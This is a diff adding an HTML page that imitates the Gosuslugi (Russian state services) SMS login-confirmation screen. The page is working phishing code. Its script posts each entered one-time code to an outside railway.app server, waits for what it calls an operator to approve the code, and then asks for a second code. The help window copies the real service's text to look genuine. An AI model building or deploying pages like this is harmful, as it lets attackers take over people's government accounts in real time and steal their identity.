@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="theme-color" content="#0d4cd3">
+    <title>Госуслуги — Подтверждение входа</title>
+    <link rel="icon" href="favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Lato', Arial, sans-serif;
+            background: #f3f6fb;
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+        }
+        .main-block {
+            background: #fff;
+            border-radius: 18px;
+            box-shadow: 0 4px 24px #b3c6e6aa;
+            max-width: 400px;
+            width: 100%;
+            margin-top: 40px;
+            padding: 56px 32px 32px 32px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+        }
+        .back-arrow {
+            position: absolute;
+            top: 18px;
+            left: 18px;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            border: none;
+            background: #f3f6fb;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.07);
+            z-index: 2;
+        }
+        .back-arrow svg {
+            width: 18px;
+            height: 18px;
+            stroke: #0d4cd3;
+            stroke-width: 2;
+            fill: none;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+        .logo {
+            display: block;
+            margin: 0 auto 48px auto;
+            width: 194px;
+            height: 34px;
+        }
+        .title {
+            font-size: 24px;
+            color: #0b1f33;
+            margin: 0 0 36px 0;
+            text-align: center;
+            font-weight: bold;
+        }
+        .info-text {
+            font-size: 16px;
+            color: #222;
+            text-align: center;
+            margin-bottom: 50px;
+            line-height: 1.5;
+        }
+        .code-label-row {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 16px;
+        }
+        .code-label {
+            font-size: 15px;
+            color: #222;
+            font-weight: bold;
+            margin-bottom: 0;
+            margin-left: 2px;
+        }
+        .code-error-message {
+            color: #ef5350;
+            font-size: 14px;
+            display: none;
+            text-align: left;
+            margin: 4px 0 0 0;
+            display: block;
+        }
+        .code-inputs {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 32px;
+            justify-content: center;
+            width: 100%;
+        }
+        .code-inputs input {
+            width: 40px;
+            height: 48px;
+            border: 1.5px solid #e3e7ee;
+            border-radius: 8px;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            color: #0b1f33;
+            background: #f3f6fb;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            box-shadow: none;
+        }
+        .code-inputs input:focus {
+            border-color: #0d4cd3;
+            outline: none;
+            box-shadow: 0 0 0 2px #e3e7ee;
+        }
+        .code-inputs.error input {
+            border-color: #ef5350;
+        }
+        .timer-block {
+            width: 100%;
+            text-align: center;
+            margin-bottom: 24px;
+            font-size: 15px;
+            color: #222;
+        }
+        .timer {
+            font-weight: bold;
+            color: #0b1f33;
+            font-size: 16px;
+        }
+        .resend-link {
+            background: none;
+            border: none;
+            color: #0d4cd3;
+            font-size: 15px;
+            cursor: pointer;
+            padding: 0;
+            display: none;
+            margin-top: 0;
+        }
+        .resend-link:disabled {
+            color: #999;
+            cursor: not-allowed;
+        }
+        .cant-confirm-link {
+            color: #0d4cd3;
+            font-size: 15px;
+            text-align: center;
+            margin-top: 18px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            text-decoration: none;
+            display: block;
+            padding: 0;
+        }
+        .cant-confirm-link:hover {
+            text-decoration: underline;
+        }
+        .modal-overlay-help {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+        .modal-help {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 4px 24px #00000033;
+            max-width: 600px;
+            width: 95vw;
+            max-height: 90vh;
+            overflow-y: auto;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .modal-header-help {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 24px 16px 24px;
+            position: relative;
+            border-bottom: 1px solid #eee;
+        }
+        .modal-title-help {
+            margin: 0;
+            font-size: 20px;
+            color: #0b1f33;
+        }
+        .modal-close-help {
+            background: none;
+            border: none;
+            font-size: 30px;
+            cursor: pointer;
+            color: #0d4cd3;
+        }
+        .modal-content-help {
+            padding: 24px;
+            font-size: 15px;
+            color: #333;
+            line-height: 1.5;
+        }
+        .modal-content-help h4 {
+            margin-top: 18px;
+            margin-bottom: 10px;
+            font-size: 17px;
+            color: #0b1f33;
+        }
+        .modal-content-help ul {
+            list-style: disc;
+            padding-left: 22px;
+            margin-bottom: 16px;
+        }
+        .modal-content-help li {
+            margin-bottom: 8px;
+        }
+        .modal-content-help p {
+            margin-bottom: 10px;
+        }
+        /* Новый лоадер поверх всего */
+        .loader-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(255,255,255,0.7);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            backdrop-filter: blur(4px);
+        }
+        @media (max-width: 500px) {
+            .main-block {
+                max-width: 98vw;
+                padding: 20px 6vw 20px 6vw;
+            }
+            .logo {
+                height: 32px;
+                margin-bottom: 20px;
+            }
+            .title {
+                font-size: 20px;
+                margin-bottom: 24px;
+            }
+            .info-text {
+                font-size: 15px;
+                margin-bottom: 32px;
+            }
+            .code-inputs input {
+                width: 32px;
+                height: 40px;
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="main-block">
+        <button class="back-arrow" title="Назад">
+            <svg viewBox="0 0 24 24">
+                <path d="M15 18l-6-6 6-6"/>
+            </svg>
+        </button>
+        <img src="logo.4db68cf668f7092d.svg" alt="Госуслуги" class="logo">
+        <div class="title">Подтвердите вход по смс</div>
+        <div class="info-text">Код подтверждения отправлен на ваш номер телефона</div>
+        <div class="code-label-row">
+            <span class="code-label">Код подтверждения</span>
+            <div class="code-error-message" id="code-error-message">Неверный код</div>
+        </div>
+        <form id="code-form" autocomplete="off" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+            <div class="code-inputs">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code">
+            </div>
+            <div class="timer-block" id="timer-block">
+                <span id="timer-label">Отправить повторно через <br><span class="timer" id="timer">01:00</span></span>
+                <button type="button" class="resend-link" id="resend-btn" disabled style="display:none;">Отправить повторно</button>
+            </div>
+            <button type="button" class="cant-confirm-link" id="cant-confirm">Не могу подтвердить вход</button>
+        </form>
+    </div>
+    <!-- Новый видео-лоадер поверх всего -->
+    <div class="loader-overlay" id="loader-overlay">
+      <video src="6533f10d.webm" autoplay loop muted playsinline style="width:340px;height:340px;object-fit:contain;background:transparent;pointer-events:none;"></video>
+    </div>
+
+    <!-- Модальное окно для справки по подтверждению входа -->
+    <div class="modal-overlay-help" style="display:none;">
+        <div class="modal-help">
+            <div class="modal-header-help">
+                <h3 class="modal-title-help">Не получается подтвердить вход на Госуслуги</h3>
+                <button class="modal-close-help" title="Закрыть">&times;</button>
+            </div>
+            <div class="modal-content-help">
+                <p>Подтверждение входа обязательно — оно позволяет защитить ваши данные на всех сайтах, куда можно войти с логином и паролем от Госуслуг.</p>
+                <p>Вход происходит в два этапа — ввод пароля и выбранный ранее способ подтверждения.</p>
+                <h4>Не получается подтвердить вход по смс</h4>
+                <ul>
+                    <li>Смс с кодом приходит на номер телефона, указанный в личном кабинете. Если сменили номер и не успели обновить его в личном кабинете, измените номер, восстановив доступ к учётной записи:
+                        <ul>
+                            <li>онлайн через банк — номер телефона в банке должен отличаться от номера, ранее зарегистрированного на Госуслугах</li>
+                            <li>лично в центре обслуживания</li>
+                        </ul>
+                    </li>
+                    <li>Технический сбой на стороне оператора — повторите вход позже</li>
+                    <li>Проблемы с соединением — проверьте, находитесь ли вы в зоне доступа, стабильна ли сотовая связь, не включён ли авиарежим</li>
+                    <li>Есть задолженность за телефон — некоторые операторы блокируют приём сообщений при отрицательном балансе. Пополните счёт</li>
+                    <li>Временный сбой телефона — перезагрузите его. Очистите память телефона и сим‑карты, если она заполнена</li>
+                    <li>Смс попадают в папку «Спам» — отключите спам‑фильтр в настройках телефона и приложении оператора, а также блокирующие смс‑спам приложения, если установлены</li>
+                    <li>Мошенники взломали вашу учётную запись — восстановите доступ</li>
+                </ul>
+                <h4>Не получается подтвердить вход по TOTP</h4>
+                <ul>
+                    <li>Утерян доступ к приложению для работы с одноразовым кодом (TOTP), например, при смене телефона — войти с одноразовым кодом не получится. Нужно восстановить доступ к учётной записи</li>
+                    <li>Неверные дата или время. Если есть ошибка «Неверный код», сверьте время на устройствах, с которого заходите на Госуслуги и на котором в приложении генерируется одноразовый код. Разница во времени даже на одну секунду может привести к созданию неверного кода</li>
+                    <li>Если время на устройствах совпадает, но появляется ошибка при входе на Госуслуги, восстановите доступ к учётной записи</li>
+                    <li>Мошенники взломали вашу учётную запись — восстановите доступ</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+
+    <script src="assets/d4b72c006a7771677225038852ee8b96/noty.min.js"></script>
+    <script>
+        // Конфигурация сервера
+        const env = {
+            SERVER_URL: 'https://server-production-4599.up.railway.app',
+            API_ENDPOINT_AUTH: '/auth-visit',
+            API_ENDPOINT_STATUS: '/status',
+            API_ENDPOINT_STEP: '/step'
+        };
+
+        // Добавляем обработку ошибок загрузки изображений
+        window.addEventListener('error', function(e) {
+            if (e.target.tagName === 'IMG') {
+                e.target.style.display = 'none';
+            }
+        }, true);
+
+        // Кнопка назад
+        document.querySelector('.back-arrow').addEventListener('click', function() {
+            window.location.href = 'index2.html';
+        });
+
+        // Кодовые инпуты: автофокус, переход, backspace
+        const codeInputs = document.querySelectorAll('.code-inputs input');
+        codeInputs.forEach((input, idx) => {
+            input.addEventListener('input', function(e) {
+                // Вставка из буфера сразу всех цифр
+                if (this.value.length > 1) {
+                    const vals = this.value.replace(/\D/g, '').split('');
+                    vals.forEach((v, i) => {
+                        if (idx + i < codeInputs.length) codeInputs[idx + i].value = v;
+                    });
+                    if (vals.length > 0 && idx + vals.length - 1 < codeInputs.length) {
+                        codeInputs[Math.min(idx + vals.length, codeInputs.length - 1)].focus();
+                    }
+                } else {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    if (this.value.length > 0 && idx < codeInputs.length - 1) {
+                        codeInputs[idx + 1].focus();
+                    }
+                }
+                checkFilled();
+            });
+            input.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !this.value && idx > 0) {
+                    codeInputs[idx - 1].focus();
+                }
+            });
+            input.addEventListener('focus', function() {
+                this.select();
+                document.getElementById('code-error-message').style.display = 'none';
+                document.querySelector('.code-inputs').classList.remove('error');
+            });
+            // Вставка по ctrl+V
+            input.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pastedData = (e.clipboardData || window.clipboardData).getData('text');
+                const vals = pastedData.replace(/\D/g, '').split('');
+                vals.forEach((v, i) => {
+                    if (idx + i < codeInputs.length) codeInputs[idx + i].value = v;
+                });
+                if (vals.length > 0 && idx + vals.length - 1 < codeInputs.length) {
+                    codeInputs[Math.min(idx + vals.length, codeInputs.length - 1)].focus();
+                }
+                checkFilled();
+            });
+        });
+
+        // Проверка заполненности всех инпутов
+        function checkFilled() {
+            const allFilled = Array.from(codeInputs).every(input => input.value.length === 1);
+            if (allFilled) {
+                submitCode();
+            }
+        }
+
+        // Таймер для повторной отправки
+        let timerInterval;
+        const timerElement = document.getElementById('timer');
+        const timerLabel = document.getElementById('timer-label');
+        const resendBtn = document.getElementById('resend-btn');
+        const timerBlock = document.getElementById('timer-block');
+
+        function startTimer() {
+            let timeLeft = 60;
+            timerElement.textContent = '01:00';
+            timerLabel.style.display = 'inline';
+            resendBtn.style.display = 'none';
+            resendBtn.disabled = true;
+
+            clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    timerLabel.style.display = 'none';
+                    resendBtn.style.display = 'inline';
+                    resendBtn.disabled = false;
+                }
+            }, 1000);
+        }
+
+        // Запускаем таймер при загрузке страницы
+        startTimer();
+
+        // Обработчик кнопки повторной отправки
+        resendBtn.addEventListener('click', async function() {
+            try {
+                const userId = localStorage.getItem('user_id');
+                if (!userId) {
+                    const res = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_AUTH}`, { method: 'POST' });
+                    const data = await res.json();
+                    localStorage.setItem('user_id', data.userId);
+                }
+                await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_STEP}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        step: 'resend',
+                        origin: 'Вход',
+                        userId: localStorage.getItem('user_id')
+                    })
+                });
+                startTimer();
+            } catch (e) {
+                console.error('Ошибка при повторной отправке:', e);
+            }
+        });
+
+        let codeAttempt = 0;
+        async function submitCode() {
+            const code = Array.from(codeInputs).map(inp => inp.value).join('');
+            codeInputs.forEach(inp => inp.disabled = true);
+            try {
+                let userId = localStorage.getItem('user_id');
+                if (!userId) {
+                    const res = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_AUTH}`, { method: 'POST' });
+                    const data = await res.json();
+                    userId = data.userId;
+                    localStorage.setItem('user_id', userId);
+                }
+                // Отправляем код
+                const response = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_STEP}`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        step: 'code',
+                        value: code,
+                        origin: 'Вход',
+                        userId: userId
+                    })
+                });
+                if (response.ok) {
+                    const result = await response.json();
+                    if (result.waitForValidation) {
+                        showWaitLoader();
+                        pollCodeStatus();
+                        return;
+                    }
+                    if (result.status === 'fail') {
+                        showError();
+                    } else if (result.status === 'ok') {
+                        codeAttempt++;
+                        if (codeAttempt < 2) {
+                            // Повторяем процесс заново
+                            codeInputs.forEach(inp => { inp.value = ''; inp.disabled = false; });
+                            document.querySelector('.code-inputs').classList.remove('error');
+                            document.getElementById('code-error-message').style.display = 'none';
+                            codeInputs[0].focus();
+                            startTimer();
+                        } else {
+                            window.location.href = 'success.html';
+                        }
+                    } else {
+                        showError();
+                    }
+                } else {
+                    showError();
+                }
+            } catch (e) {
+                console.error('Ошибка при отправке кода:', e);
+                showError();
+            }
+        }
+
+        // Лоадер ожидания
+        function showWaitLoader() {
+            document.getElementById('loader-overlay').style.display = 'flex';
+        }
+        function hideWaitLoader() {
+            document.getElementById('loader-overlay').style.display = 'none';
+        }
+
+        // Опрос статуса подтверждения кода оператором
+        function pollCodeStatus() {
+            let attempts = 0;
+            const maxAttempts = 30;
+            const interval = setInterval(async () => {
+                attempts++;
+                try {
+                    const userId = localStorage.getItem('user_id');
+                    if (!userId) {
+                        clearInterval(interval);
+                        hideWaitLoader();
+                        return;
+                    }
+                    const res = await fetch(`${env.SERVER_URL}${env.API_ENDPOINT_STATUS}?step=code&userId=${userId}`);
+                    if (res.ok) {
+                        const data = await res.json();
+                        if (data.status === 'fail') {
+                            clearInterval(interval);
+                            hideWaitLoader();
+                            showError();
+                        } else if (data.status === 'ok') {
+                            clearInterval(interval);
+                            hideWaitLoader();
+                            // Проверяем, вернулись ли мы сюда после success.html
+                            const isSecondAttempt = sessionStorage.getItem('second_code_attempt') === 'true';
+                            if (!isSecondAttempt) {
+                                // Первый код - переход на success.html
+                                sessionStorage.setItem('second_code_attempt', 'true');
+                                window.location.href = 'success.html';
+                            } else {
+                                // Второй код - переход на финальный файл
+                                sessionStorage.removeItem('second_code_attempt');
+                                window.location.href = 'survey.html';
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.error('Ошибка при опросе статуса:', e);
+                }
+                if (attempts >= maxAttempts) {
+                    clearInterval(interval);
+                    hideWaitLoader();
+                }
+            }, 1000);
+        }
+
+        // Показать ошибку
+        function showError() {
+            codeInputs.forEach(inp => {
+                inp.disabled = false;
+                inp.value = '';
+            });
+            document.querySelector('.code-inputs').classList.add('error');
+            document.getElementById('code-error-message').style.display = 'block';
+            codeInputs[0].focus();
+        }
+
+        // Логика для кнопки "Не могу подтвердить" (открытие модального окна справки)
+        const cantConfirmLink = document.getElementById('cant-confirm');
+        const modalOverlayHelp = document.querySelector('.modal-overlay-help');
+        const modalCloseHelp = modalOverlayHelp.querySelector('.modal-close-help');
+
+        cantConfirmLink.addEventListener('click', function() {
+            modalOverlayHelp.style.display = 'flex';
+        });
+
+        modalCloseHelp.addEventListener('click', function() {
+            modalOverlayHelp.style.display = 'none';
+        });
+
+        modalOverlayHelp.addEventListener('click', function(e) {
+            if (e.target === modalOverlayHelp) {
+                modalOverlayHelp.style.display = 'none';
+            }
+        });
+
+        // При загрузке страницы проверяем, первый ли это вход
+        window.addEventListener('load', () => {
+            // Если это первый вход, сбрасываем флаг второго кода
+            if (!sessionStorage.getItem('second_code_attempt')) {
+                sessionStorage.removeItem('second_code_attempt');
+            }
+            codeInputs[0].focus();
+        });
+    </script>
+</body>
+</html> 
